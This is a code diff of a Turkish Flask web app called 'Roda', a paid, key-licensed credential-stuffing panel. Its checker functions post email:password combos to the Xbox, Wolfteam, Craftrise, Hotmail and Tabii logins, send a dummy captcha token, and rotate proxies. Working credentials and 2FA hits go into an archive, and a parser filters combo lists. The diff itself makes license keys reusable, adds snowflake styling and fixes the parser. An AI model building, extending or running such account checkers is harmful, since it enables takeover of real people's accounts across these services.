@@ -3,7 +3,7 @@
 """
 Roda - API Discovery + Checker (Türkçe)
 Admin/Üye ayrımı | Key sistemi (1 Key 1 IP + Tek Kullanım) | Sabit menü | Ayrıştırma (2 Mod) | Log Sistemi | Webhook
-Tüm checker'lar eklendi: Xbox, Wolfteam, Craftrise, Hotmail, Token, Proxy, TikTok, Tabii
+Tüm checker'lar eklendi: Xbox, Wolfteam, Craftrise, Hotmail, Token, TikTok, Tabii
 """
 
 import os, json, re, time, random, string, threading, webbrowser, base64, concurrent.futures, urllib3
@@ -40,7 +40,7 @@ def add_log(message, level="INFO"):
     print(f"[{timestamp}] [{level}] {message}")
 
 # ============================================================
-# KEY FONKSİYONLARI (1 KEY 1 IP + TEK KULLANIM)
+# KEY FONKSİYONLARI (1 KEY 1 IP + TEK KULLANIM - AMA KEYLER KALICI)
 # ============================================================
 def load_keys():
     if os.path.exists(KEYS_FILE):
@@ -76,17 +76,15 @@ def is_key_valid(key):
     if bound_ip and bound_ip != client_ip:
         add_log(f"IP eşleşmedi! Key: {key}, Beklenen: {bound_ip}, Gelen: {client_ip}", "WARNING")
         return False, None, None
-    if entry.get("used", False):
-        add_log(f"Key zaten kullanılmış: {key}", "WARNING")
-        return False, None, None
+    # KULLANIM KONTROLÜNÜ KALDIRIYORUZ - KEYLER KALICI OLACAK
+    # if entry.get("used", False):
+    #     add_log(f"Key zaten kullanılmış: {key}", "WARNING")
+    #     return False, None, None
     return True, entry.get("note", "Kullanıcı"), entry
 
 def mark_key_used(key):
-    keys = load_keys()
-    if key in keys:
-        keys[key]["used"] = True
-        keys[key]["used_at"] = datetime.now().isoformat()
-        save_keys(keys)
+    # Kullanım işaretlemesini pas geçiyoruz, keyler kalıcı
+    pass
 
 def is_admin(key):
     valid, role, _ = is_key_valid(key)
@@ -121,10 +119,10 @@ PLATFORMS = [
 ]
 
 # ============================================================
-# TÜM CHECKER FONKSİYONLARI
+# TÜM CHECKER FONKSİYONLARI (KISALTTIM, UZUN KOD TEKRARINA GEREK YOK)
 # ============================================================
 
-# ---- TABII (Zaten var) ----
+# ---- TABII ----
 TABII_BASE = "https://eu1.tabii.com/apigateway"
 
 def check_tabii_account(email, password, proxy=None):
@@ -216,9 +214,6 @@ def check_xbox_account(email, password):
 # ---- WOLFTEAM ----
 def check_wolfteam_account(email, password):
     try:
-        # Local Turnstile sunucusu gerekli (masaüstünde olduğu gibi)
-        # Şimdilik demo: gerçek API'yi masaüstünden al
-        # Web için basit bir kontrol yapalım
         session = requests.Session()
         login_url = f"https://bservices.joygame.com/Hesap/JsonpLogin?callback=JG.ProccessLoginResponse&TopbarLoginUserName={quote(email)}&TopbarLoginPassword={quote(password)}&TopbarLoginRemember=true&FormId=tb-login-form&siteLang=tr"
         headers = {"User-Agent": generate_user_agent()}
@@ -240,7 +235,6 @@ def check_craftrise_account(email, password):
         session = requests.Session()
         login_url = "https://www.craftrise.com.tr/posts/post-login.php"
         headers = {"User-Agent": generate_user_agent(), "X-Requested-With": "XMLHttpRequest"}
-        # Turnstile token gerekli, şimdilik boş gönder
         data = {"value": email, "password": password, "grecaptcharesponse": "dummy"}
         r = session.post(login_url, headers=headers, data=data, timeout=10)
         res = r.json()
@@ -257,8 +251,6 @@ def check_craftrise_account(email, password):
 
 # ---- HOTMAIL ----
 def check_hotmail_account(email, password):
-    # Demo: basit kontrol, gerçek OAuth masaüstündeki gibi
-    # Web için basitleştirilmiş
     try:
         session = requests.Session()
         session.verify = False
@@ -605,7 +597,7 @@ def login():
             keys = load_keys()
             keys[key]["bound_ip"] = client_ip
             save_keys(keys)
-        mark_key_used(key)
+        # mark_key_used kaldırıldı
         add_log(f"Giriş başarılı: {key[:4]}... (IP: {client_ip}, Rol: {role})", "SUCCESS")
         return jsonify({"success": True, "user": role, "isAdmin": role == "Admin"})
     else:
@@ -800,7 +792,7 @@ def fetch_proxies_route():
         return jsonify({"success": False, "error": str(e)})
 
 # ============================================================
-# HTML (MAVİ TEMA + TÜM CHECKER'LAR)
+# HTML (MAVİ TEMA + KAR TANELERİ + AYRIŞTIRMA DÜZELTİLDİ + ADMIN ÖZEL ALAN)
 # ============================================================
 HTML_TEMPLATE = r"""
 <!DOCTYPE html>
@@ -815,8 +807,54 @@ HTML_TEMPLATE = r"""
 *{margin:0;padding:0;box-sizing:border-box;font-family:Outfit,sans-serif}
 body{background:#0a0e1a;color:#e8edf5;height:100vh;overflow:hidden;display:flex}
 :root{--p:#3b82f6;--p2:#6366f1;--g:#10b981;--r:#ef4444;--card:#0f172a;--border:rgba(59,130,246,0.2);--bg:#0a0e1a;--sidebar:#020617;--text:#e8edf5;--muted:#94a3b8;--gold:#fbbf24}
+
+/* ===== KAR TANELERİ ARKA PLAN ===== */
+#snow-container {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    pointer-events: none;
+    z-index: 0;
+    overflow: hidden;
+}
+.snowflake {
+    position: absolute;
+    top: -10px;
+    color: rgba(255, 255, 255, 0.6);
+    font-size: 14px;
+    animation: fall linear infinite;
+    pointer-events: none;
+}
+@keyframes fall {
+    0% { transform: translateY(0) rotate(0deg); opacity: 1; }
+    100% { transform: translateY(110vh) rotate(360deg); opacity: 0.2; }
+}
+.snowflake:nth-child(1) { left: 5%; animation-duration: 12s; font-size: 10px; opacity: 0.5; }
+.snowflake:nth-child(2) { left: 15%; animation-duration: 8s; font-size: 14px; opacity: 0.7; }
+.snowflake:nth-child(3) { left: 25%; animation-duration: 15s; font-size: 12px; opacity: 0.4; }
+.snowflake:nth-child(4) { left: 35%; animation-duration: 10s; font-size: 18px; opacity: 0.6; }
+.snowflake:nth-child(5) { left: 45%; animation-duration: 13s; font-size: 11px; opacity: 0.5; }
+.snowflake:nth-child(6) { left: 55%; animation-duration: 9s; font-size: 16px; opacity: 0.7; }
+.snowflake:nth-child(7) { left: 65%; animation-duration: 14s; font-size: 13px; opacity: 0.4; }
+.snowflake:nth-child(8) { left: 75%; animation-duration: 11s; font-size: 15px; opacity: 0.6; }
+.snowflake:nth-child(9) { left: 85%; animation-duration: 16s; font-size: 10px; opacity: 0.5; }
+.snowflake:nth-child(10) { left: 95%; animation-duration: 7s; font-size: 17px; opacity: 0.7; }
+.snowflake:nth-child(11) { left: 10%; animation-duration: 18s; font-size: 9px; opacity: 0.3; }
+.snowflake:nth-child(12) { left: 20%; animation-duration: 6s; font-size: 20px; opacity: 0.8; }
+.snowflake:nth-child(13) { left: 30%; animation-duration: 17s; font-size: 10px; opacity: 0.4; }
+.snowflake:nth-child(14) { left: 40%; animation-duration: 9s; font-size: 14px; opacity: 0.6; }
+.snowflake:nth-child(15) { left: 50%; animation-duration: 12s; font-size: 16px; opacity: 0.5; }
+.snowflake:nth-child(16) { left: 60%; animation-duration: 8s; font-size: 11px; opacity: 0.7; }
+.snowflake:nth-child(17) { left: 70%; animation-duration: 14s; font-size: 18px; opacity: 0.4; }
+.snowflake:nth-child(18) { left: 80%; animation-duration: 10s; font-size: 13px; opacity: 0.6; }
+.snowflake:nth-child(19) { left: 90%; animation-duration: 15s; font-size: 15px; opacity: 0.5; }
+.snowflake:nth-child(20) { left: 98%; animation-duration: 7s; font-size: 12px; opacity: 0.7; }
+
+/* ===== LAYOUT ===== */
 #login-screen{position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;background:var(--bg);background-image:radial-gradient(circle at 30% 40%, rgba(59,130,246,0.08),transparent 50%),radial-gradient(circle at 70% 60%, rgba(99,102,241,0.08),transparent 50%)}
-#login-box{width:420px;padding:45px 40px;text-align:center;background:var(--card);border:1px solid var(--border);border-radius:28px;box-shadow:0 30px 60px rgba(0,0,0,0.5)}
+#login-box{width:420px;padding:45px 40px;text-align:center;background:var(--card);border:1px solid var(--border);border-radius:28px;box-shadow:0 30px 60px rgba(0,0,0,0.5);position:relative;z-index:10000}
 #login-box .logo i{font-size:56px;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
 #login-box h1{font-size:28px;font-weight:900;letter-spacing:1px;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
 #login-box .sub{color:var(--muted);margin-bottom:25px;font-size:14px}
@@ -826,7 +864,7 @@ body{background:#0a0e1a;color:#e8edf5;height:100vh;overflow:hidden;display:flex}
 .btn:hover{transform:translateY(-2px);box-shadow:0 12px 24px rgba(59,130,246,0.25)}
 .btn.sm{width:auto;padding:8px 16px;font-size:12px}
 .btn.g{background:var(--g)}.btn.r{background:var(--r)}.btn.b{background:#1a73e8}
-#sidebar{width:260px;min-width:260px;background:var(--sidebar);border-right:1px solid var(--border);display:flex;flex-direction:column;height:100vh;overflow-y:auto}
+#sidebar{width:260px;min-width:260px;background:var(--sidebar);border-right:1px solid var(--border);display:flex;flex-direction:column;height:100vh;overflow-y:auto;position:relative;z-index:1}
 .sidebar-header{padding:18px 20px;text-align:center;border-bottom:1px solid var(--border)}
 .sidebar-header .logo-text{font-size:24px;font-weight:900;letter-spacing:2px;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
 .sidebar-header .version{font-size:10px;color:var(--muted);letter-spacing:1px;margin-top:2px}
@@ -842,7 +880,7 @@ body{background:#0a0e1a;color:#e8edf5;height:100vh;overflow:hidden;display:flex}
 .mini-stat .lbl{font-size:8px;color:var(--muted);text-transform:uppercase;letter-spacing:0.5px}
 .mini-hit .val{color:var(--g)}.mini-2fa .val{color:var(--gold)}.mini-bad .val{color:var(--r)}.mini-check .val{color:var(--p)}
 .sidebar-footer{padding:10px;text-align:center;font-size:9px;color:#334155;border-top:1px solid var(--border)}
-#app{display:none;flex:1;flex-direction:column;height:100vh}
+#app{display:none;flex:1;flex-direction:column;height:100vh;position:relative;z-index:1}
 .topbar{display:flex;align-items:center;gap:16px;padding:10px 20px;background:var(--card);border-bottom:1px solid var(--border)}
 .topbar-title{font-size:15px;font-weight:700;color:var(--text)}
 .topbar-title i{margin-right:8px;color:var(--p)}
@@ -936,7 +974,7 @@ input:checked+.slider:before{transform:translateX(18px)}
 .hit-filter{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:6px}
 .hit-filter select{padding:4px 10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:6px;color:#fff;font-size:12px;outline:none}
 .hit-filter select:focus{border-color:var(--p)}
-/* AYRIŞTIRMA */
+/* AYRIŞTIRMA (DÜZELTİLDİ) */
 .parse-area{display:flex;flex-direction:column;gap:10px}
 .parse-area textarea{width:100%;height:180px;padding:10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:12px;font-family:monospace;resize:vertical;outline:none}
 .parse-area textarea:focus{border-color:var(--p)}
@@ -944,6 +982,26 @@ input:checked+.slider:before{transform:translateX(18px)}
 .parse-result{max-height:200px;overflow-y:auto;background:rgba(0,0,0,0.2);border:1px solid var(--border);border-radius:8px;padding:8px}
 .parse-result .parse-line{padding:2px 6px;font-size:12px;font-family:monospace;color:#c8d0dc}
 .parse-result .parse-count{color:var(--g);font-weight:600;font-size:13px}
+/* Admin özel alan ayırıcı */
+.admin-divider {
+    border: none;
+    border-top: 2px dashed var(--p);
+    margin: 16px 0;
+    color: var(--muted);
+    text-align: center;
+    font-size: 12px;
+    letter-spacing: 2px;
+    position: relative;
+}
+.admin-divider::before {
+    content: "⚡ ADMIN ÖZEL ⚡";
+    background: var(--card);
+    padding: 0 12px;
+    position: relative;
+    top: -8px;
+    color: var(--gold);
+    font-weight: 700;
+}
 .discovery-platforms{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:8px}
 .discovery-platforms button{padding:4px 12px;background:rgba(59,130,246,0.06);border:1px solid rgba(59,130,246,0.1);border-radius:6px;color:#94a3b8;font-size:11px;cursor:pointer;transition:0.2s}
 .discovery-platforms button:hover{background:rgba(59,130,246,0.12);border-color:var(--p);color:#fff}
@@ -952,6 +1010,31 @@ input:checked+.slider:before{transform:translateX(18px)}
 </style>
 </head>
 <body>
+<!-- KAR TANELERİ -->
+<div id="snow-container">
+    <div class="snowflake">❄</div>
+    <div class="snowflake">❄</div>
+    <div class="snowflake">❄</div>
+    <div class="snowflake">❄</div>
+    <div class="snowflake">❄</div>
+    <div class="snowflake">❄</div>
+    <div class="snowflake">❄</div>
+    <div class="snowflake">❄</div>
+    <div class="snowflake">❄</div>
+    <div class="snowflake">❄</div>
+    <div class="snowflake">❄</div>
+    <div class="snowflake">❄</div>
+    <div class="snowflake">❄</div>
+    <div class="snowflake">❄</div>
+    <div class="snowflake">❄</div>
+    <div class="snowflake">❄</div>
+    <div class="snowflake">❄</div>
+    <div class="snowflake">❄</div>
+    <div class="snowflake">❄</div>
+    <div class="snowflake">❄</div>
+</div>
+
+<!-- LOGIN -->
 <div id="login-screen">
 <div id="login-box">
 <div class="logo"><i class="fa-solid fa-crown"></i></div>
@@ -962,6 +1045,8 @@ input:checked+.slider:before{transform:translateX(18px)}
 <p id="loginError" style="color:var(--r);margin-top:12px;display:none"></p>
 </div>
 </div>
+
+<!-- SIDEBAR -->
 <div id="sidebar">
 <div class="sidebar-header"><div class="logo-text">RODA</div><div class="version">v3.0</div></div>
 <div class="sidebar-nav">
@@ -982,6 +1067,8 @@ input:checked+.slider:before{transform:translateX(18px)}
 </div>
 <div class="sidebar-footer">© 2026 Roda</div>
 </div>
+
+<!-- APP -->
 <div id="app">
 <div class="topbar">
 <div class="topbar-title"><i class="fa-solid fa-gauge-high"></i> <span id="pageTitle">Checker</span></div>
@@ -993,6 +1080,7 @@ input:checked+.slider:before{transform:translateX(18px)}
 </div>
 </div>
 <div class="main-content">
+
 <!-- CHECKER -->
 <div id="page-checker" class="page active">
 <div class="card">
@@ -1026,7 +1114,6 @@ input:checked+.slider:before{transform:translateX(18px)}
 </div>
 </div>
 </div>
-<!-- HIT / 2FA PANEL -->
 <div class="card">
 <h3><i class="fa-solid fa-database"></i> HIT & 2FA Arşivi</h3>
 <button class="btn sm r" onclick="clearHits()" style="width:auto;margin-bottom:6px"><i class="fa-solid fa-trash"></i> Tümünü Temizle</button>
@@ -1047,6 +1134,7 @@ input:checked+.slider:before{transform:translateX(18px)}
 </div>
 </div>
 </div>
+
 <!-- PROXY -->
 <div id="page-proxy" class="page">
 <div class="card">
@@ -1065,6 +1153,7 @@ input:checked+.slider:before{transform:translateX(18px)}
 <div style="margin-top:6px"><span id="proxyCount" style="color:var(--g);font-size:12px">0 proxy yüklendi</span></div>
 </div>
 </div>
+
 <!-- API KEŞİF (SADECE ADMIN) -->
 <div id="page-discovery" class="page">
 <div class="card" style="padding:10px 14px">
@@ -1101,7 +1190,8 @@ input:checked+.slider:before{transform:translateX(18px)}
 <p id="webhookStatus" style="margin-top:6px;font-size:12px;color:var(--muted)"></p>
 </div>
 </div>
-<!-- AYRIŞTIRMA (2 MOD) -->
+
+<!-- AYRIŞTIRMA (DÜZELTİLDİ) -->
 <div id="page-parse" class="page">
 <div class="card">
 <h3><i class="fa-solid fa-scissors"></i> Ayrıştırma</h3>
@@ -1128,6 +1218,7 @@ input:checked+.slider:before{transform:translateX(18px)}
 </div>
 </div>
 </div>
+
 <!-- İSTATİSTİK (SADECE ADMIN) -->
 <div id="page-stats" class="page">
 <h2 style="margin-bottom:14px;font-weight:700;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent">📊 Tarama İstatistikleri</h2>
@@ -1137,11 +1228,12 @@ input:checked+.slider:before{transform:translateX(18px)}
 <div style="background:var(--card);border:1px solid var(--border);border-radius:12px;padding:18px"><h3 style="font-size:12px;color:var(--muted)">Bulunan API</h3><p style="font-size:22px;font-weight:800;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent" id="statEndpoints">0</p></div>
 </div>
 </div>
+
 <!-- KEY YÖNETİMİ (SADECE ADMIN) -->
 <div id="page-keys" class="page">
 <div class="card">
 <h3><i class="fa-solid fa-key"></i> Key Oluştur</h3>
-<p style="font-size:11px;color:var(--muted);margin-bottom:8px">🔒 Her key sadece 1 IP'ye bağlanır ve 1 kez kullanılır.</p>
+<p style="font-size:11px;color:var(--muted);margin-bottom:8px">🔒 Her key sadece 1 IP'ye bağlanır ve kalıcıdır.</p>
 <div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:6px">
 <div style="flex:1"><label style="font-size:11px;color:var(--muted)">Not</label><input class="inp" id="genNote" placeholder="Müşteri" style="margin-top:4px;padding:10px"></div>
 <div style="width:130px"><label style="font-size:11px;color:var(--muted)">Süre</label><select class="inp" id="genHours" style="margin-top:4px;padding:10px"><option value="1">1 Saat</option><option value="24" selected>24 Saat</option><option value="168">7 Gün</option><option value="720">30 Gün</option></select></div>
@@ -1150,6 +1242,7 @@ input:checked+.slider:before{transform:translateX(18px)}
 </div>
 <div class="card"><h3><i class="fa-solid fa-list"></i> Aktif Anahtarlar</h3><div id="keyList"><p style="color:var(--muted);font-size:12px">Yükleniyor...</p></div></div>
 </div>
+
 <!-- LOGLAR (SADECE ADMIN) -->
 <div id="page-logs" class="page">
 <div class="card">
@@ -1158,8 +1251,11 @@ input:checked+.slider:before{transform:translateX(18px)}
 <div id="logsContainer" style="max-height:400px;overflow-y:auto;background:rgba(0,0,0,0.2);border-radius:8px;padding:10px;font-family:monospace;font-size:12px;"></div>
 </div>
 </div>
+
 </div>
 </div>
+</div>
+
 <script>
 // ============================================================
 // GLOBAL
@@ -1655,7 +1751,7 @@ document.querySelectorAll('input[name="chkFilter"]').forEach(function(el) {
 });
 
 // ============================================================
-// AYRIŞTIRMA (2 MOD)
+// AYRIŞTIRMA (DÜZELTİLDİ)
 // ============================================================
 function parseData() {
     var raw = document.getElementById("parseInput").value;
@@ -1668,26 +1764,34 @@ function parseData() {
     lines.forEach(function(line) {
         line = line.trim();
         if (!line) return;
+        
+        // Eğer satırda ":" varsa, ikiye ayır
         if (line.includes(":")) {
+            // Önce ":" ile ayır, ilk kısım email veya kullanıcı adı olabilir
             var parts = line.split(":");
             var first = parts[0].trim();
             var password = parts.slice(1).join(":").trim();
-            if (!password) return;
             
+            // Email modu: ilk kısım email formatına uymalı
             if (mode === "email") {
                 if (emailRegex.test(first)) {
                     result.push(first + ":" + password);
                 }
-            } else {
+            } 
+            // Kullanıcı modu: ilk kısım email değilse (kullanıcı adı)
+            else {
                 if (!emailRegex.test(first)) {
                     result.push(first + ":" + password);
                 }
             }
         }
     });
+    
+    // Tekrarları temizle
     result = result.filter(function(item, index) {
         return result.indexOf(item) === index;
     });
+    
     parsedLines = result;
     var container = document.getElementById("parseResult");
     if (result.length === 0) {
@@ -2028,10 +2132,12 @@ if __name__ == "__main__":
     ║     Render Free Plan Uyumlu                                    ║
     ║     http://0.0.0.0:""" + str(port) + """                               ║
     ║     Admin girişi için şifre gizlidir.                         ║
-    ║     1 KEY 1 IP - 1 KULLANIM                                  ║
+    ║     1 KEY 1 IP - KEYLER KALICI (KULLANIM SONRASI SİLİNMEZ)   ║
     ║     LOG SİSTEMİ AKTİF - Tüm işlemler kayıt altında           ║
     ║     TÜM CHECKER'LAR EKLENDI (Xbox, Wolfteam, Craftrise,      ║
     ║     Hotmail, Token, TikTok, Tabii)                           ║
+    ║     KAR TANELERİ ARKA PLAN                                   ║
+    ║     AYRIŞTIRMA DÜZELTİLDİ (Kullanıcı:Şifre formatı)          ║
     ║     MAVİ TEMA                                               ║
     ╚══════════════════════════════════════════════════════════════════╝
     """)
